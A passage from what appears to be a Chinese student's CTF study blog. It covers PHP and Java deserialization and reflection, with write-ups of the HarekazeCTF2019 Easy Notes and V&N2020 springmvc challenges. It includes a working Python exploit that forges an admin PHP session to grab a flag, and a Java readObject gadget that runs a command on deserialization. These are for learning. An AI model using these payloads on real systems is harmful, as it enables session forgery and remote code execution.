<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $c=9223372036854775806;</span></span><br><span class="line"><span class="comment">// $count[++$c]=1;</span></span><br><span class="line"><span class="comment">// if($count[]=1)&#123;</span></span><br><span class="line"><span class="comment">//     $c+=1;</span></span><br><span class="line"><span class="comment">//     var_dump($count);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use User as GlobalUser;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $data  = &#x27;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D&#x27;;</span></span><br><span class="line"><span class="comment">// var_dump(unserialize(urldecode($data)));</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> User()));</span><br></pre></td></tr></table></figure>

<p>抓包修改cookie之后，get传<code>backdoor</code>，但是发现好多函数和类都被ban了，之后去参考别的师傅的wp，但是发现好多要学习的点（</p>
<p><img src="https://img-blog.csdnimg.cn/9f377ede4e1d4feca2282f2a033ef63c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第四周学习</title>
    <url>/2022/02/16/%E9%9B%86%E8%AE%AD%E7%AC%AC%E5%9B%9B%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h4><ul>
<li>session反序列化</li>
</ul>
<p>session在php中的存储方式为为 <code>键名+竖线+经过serialize函数序列处理的值</code> ，这就可以伪造 <code>admin</code> 了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://e2cec884-8829-4092-a14e-072d64de4f5f.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sessid)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>java初步学习</title>
    <url>/2022/03/18/java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p> 因为上学期学了java课，但是发现别的班讲了序列化和正则之类的，所以打算学一下</p>
</blockquote>
<h4 id="一、序列化概述"><a href="#一、序列化概述" class="headerlink" title="一、序列化概述"></a>一、序列化概述</h4><p>序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 有序列化，就有反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。<u>（来源网络）</u></p>
<p>序列化最重要的作用：在传递和保存对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在网络上传输或者保存在本地文件中。</p>
<p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p>
<p>总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p>
<p>例如在php中如果要保存一个类，可以利用序列化将类保存成二进制内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var_dump(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(12) &quot;O:1:&quot;A&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="二、java序列化"><a href="#二、java序列化" class="headerlink" title="二、java序列化"></a>二、java序列化</h4><blockquote>
<p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br>只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。<br>　　对象序列化包括如下步骤：<br>　　1） 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；<br>　　2） 通过对象输出流的writeObject()方法写对象。</p>
<p>　　对象反序列化的步骤如下：<br>　　1） 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；<br>　　2） 通过对象输入流的readObject()方法读取对象。</p>
</blockquote>
<p>所以可以用不同的方式实现对象的序列化</p>
<p><a href="https://www.runoob.com/java/java-serialization.html">菜鸟教程</a></p>
<h5 id="1-初步认识java序列化和反序列化"><a href="#1-初步认识java序列化和反序列化" class="headerlink" title="1.初步认识java序列化和反序列化"></a>1.初步认识java序列化和反序列化</h5><p>//用于序列化的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    Student(<span class="keyword">int</span> id,String name,<span class="keyword">char</span> sex)&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>//实现序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Student std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功！&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// �� sr demo.Student��e�(�� I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br></pre></td></tr></table></figure>

<p>//实现反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        Student student = (Student) objectInputStream.readObject();</span><br><span class="line">        System.out.println(student.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-深入学习"><a href="#2-深入学习" class="headerlink" title="2.深入学习"></a>2.深入学习</h5><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">java序列化和反序列化全讲解</a></p>
<p>序列化方法：原生、xml、json等</p>
<ol>
<li>序列化的类必须实现Serialize接口</li>
<li>静态变量不能被序列化</li>
<li><code>transient</code>不参与序列化</li>
</ol>
<p><code>readObject</code>方法的安全问题：当类被反序列化的时候，如果类里面有<code>readObejct</code>方法就会自动执行代码（只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力</p>
<p><strong>Tips:</strong></p>
<blockquote>
<p>共同条件 继承Serialize</p>
</blockquote>
<blockquote>
<p>入口类 source（重写readObject=&gt;调用常见的函数 参数类型宽泛 最好jdk自带） 如 <code>Map</code>、<code>HashMap</code></p>
</blockquote>
<blockquote>
<p>调用链 gadget chain</p>
</blockquote>
<blockquote>
<p>执行类 sink （rce ssrf 写文件……）</p>
</blockquote>
<p><strong>漏洞相关：</strong></p>
<p>当进行ssrf的时候，java中的<code>URL</code>类（可序列化）</p>
<h5 id="3-深入学习之java反射"><a href="#3-深入学习之java反射" class="headerlink" title="3.深入学习之java反射"></a>3.深入学习之java反射</h5><p><strong>反射：</strong>一开始我们并不知道我们要初始化的类对象是什么，自然也无法使用new关键字来创建对象</p>
<p>（可利用java反射调用default修饰的类、调用方法</p>
<p><code>Student</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    Student(int id,String name,char sex)&#123;</span></span><br><span class="line"><span class="comment">//        this.id = id;</span></span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        this.sex = sex;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is a student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>RefectionTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefectionTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        Class c = student.getClass();</span><br><span class="line">        <span class="comment">// 反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从原型class里实例化对象</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line">        <span class="comment">// 可以利用这个来获取构造方法</span></span><br><span class="line">        <span class="comment">// 然后getConstructor方法里面可以写入参数 类似于String.class用来匹配我们想要实例化</span></span><br><span class="line">        <span class="comment">// 的类的有参构造方法的参数</span></span><br><span class="line">        Constructor constructor = c.getConstructor();</span><br><span class="line">        <span class="comment">// 进行实例化</span></span><br><span class="line">        Student student1 = (Student) constructor.newInstance();</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类里面属性</span></span><br><span class="line"><span class="comment">//        c.getFields(); // 获取所有属性</span></span><br><span class="line">        <span class="comment">// getFields获取public的属性</span></span><br><span class="line">        <span class="comment">// getDeclaredFields获取所有属性</span></span><br><span class="line"><span class="comment">//        Field[] fields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : fields)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// getField只能获取public的属性</span></span><br><span class="line">        <span class="comment">// 不能修改私有属性的值 访问</span></span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现对私有属性变量的访问和修改</span></span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(student1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m : method)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果方法无参数则如下</span></span><br><span class="line">        Method action = c.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        action.invoke(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果方法有参数 要说明调用函数的参数的数据类型</span></span><br><span class="line">        <span class="comment">// 然后也要注意如果方法是私有属性的方法 不能随意访问</span></span><br><span class="line">        Method action1 = c.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 实现对私有属性的方法的访问</span></span><br><span class="line">        action.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        action1.invoke(student1,<span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="V-amp-N2020公开赛-springmvc"><a href="#V-amp-N2020公开赛-springmvc" class="headerlink" title="[V&amp;N2020公开赛]springmvc"></a>[V&amp;N2020公开赛]springmvc</h5><p><a href="buuoj.cn">buuoj.cn</a></p>
<p><u>1.先自己做</u></p>
<p>因为还没学过Spring框架，也不会搭，就先自己随便看看代码了</p>
<p>可以发现<code>Tools</code>类是存在<code>Serialize</code>接口的，所以是可以序列化的，并且写了序列化和反序列化的函数，最后还重写了<code>readObject</code>，所以该类应该就是我们可以利用的类</p>
<p>那我们可以先来看看readObject方法，发现可要传入的是反序列化之后的内容，其实应该也算是传入一个对象，然后进行实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       Object obj = in.readObject();</span><br><span class="line">       (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以找找看<code>ProcessBuilder</code>类</p>
<p><img src="https://img-blog.csdnimg.cn/a97256bde2c440d9a1f9804720df1b5b.png" alt="img"></p>
<p>再看看其他的类</p>
<p>可以找到比较特别的类，<code>ClientInfoFilter</code>，因为这里调用了Tools中的序列化函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tools.ClientInfo;</span><br><span class="line"><span class="keyword">import</span> com.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Decoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClentInfoFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClentInfoFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig fcg)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies(); <span class="comment">//获取Cookie</span></span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123; <span class="comment">// 如果Cookie不为空</span></span><br><span class="line">            Cookie[] var7 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var8 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var9 = <span class="number">0</span>; var9 &lt; var8; ++var9) &#123;</span><br><span class="line">                Cookie c = var7[var9];</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;cinfo&quot;</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes;</span><br><span class="line">        <span class="keyword">if</span> (exist) &#123; <span class="comment">// 如果Cookie中的名字为cinfo为true</span></span><br><span class="line">            String b64 = cookie.getValue(); <span class="comment">// 获取内容</span></span><br><span class="line">            Decoder decoder = Base64.getDecoder(); <span class="comment">// base解码</span></span><br><span class="line">            bytes = decoder.decode(b64); <span class="comment">// 转成字节</span></span><br><span class="line">            ClientInfo cinfo = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (!b64.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; bytes != <span class="keyword">null</span>) &#123; <span class="comment">// 如果都不为空</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cinfo = (ClientInfo)Tools.parse(bytes); <span class="comment">// 进行反序列化 并实例化成ClientInfo的对象</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">                    var14.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); <span class="comment">// 如果内容为空 则进行实例化</span></span><br><span class="line">                Encoder encoder = Base64.getEncoder();<span class="comment">// base加密</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytes = Tools.create(cinfo); <span class="comment">// 进行序列化</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                    var15.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                cookie.setValue(encoder.encodeToString(bytes)); <span class="comment">// 设置cookie</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo); </span><br><span class="line">            <span class="comment">// 获取session并增加属性为cinfo 将值传进去</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Encoder encoder = Base64.getEncoder(); <span class="comment">// 如果cookie不存在 将encoder实例化成base64的加密</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClientInfo cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); </span><br><span class="line">                bytes = Tools.create(cinfo);</span><br><span class="line">                cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));</span><br><span class="line">                cookie.setMaxAge(<span class="number">86400</span>);</span><br><span class="line">                ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">                ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                var13.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计下来，可以发现如果我们要利用这个类的话，那应该是要满足第一个if语句，然后调用反序列化函数，并且要反序列化Tool类，从而执行Tool类里面的readObject方法，然后进行命令执行，虽然大概思路是知道的，但是无从下手（菜</p>
<p>看看别的师傅的wp吧！！</p>
<p><u>2.学习！</u></p>
<p>发现我的思路也对，总的来说就是要把我们伪造的序列化字符串放入cookie中，然后反序列化进行命令执行，那么现在比较难理解的就是该怎么进行命令执行了</p>
<blockquote>
<p>理解：Tools类中还存在一个属性testCall是我们可以利用的，而在最后命令执行的时候会以String[]接收数据，那在序列化的时候将testCall改成String[]然后将命令传进去，那反序列化调用的时候就会执行我们写入的语句</p>
</blockquote>
<p>exp:</p>
<p><code>Tools</code></p>
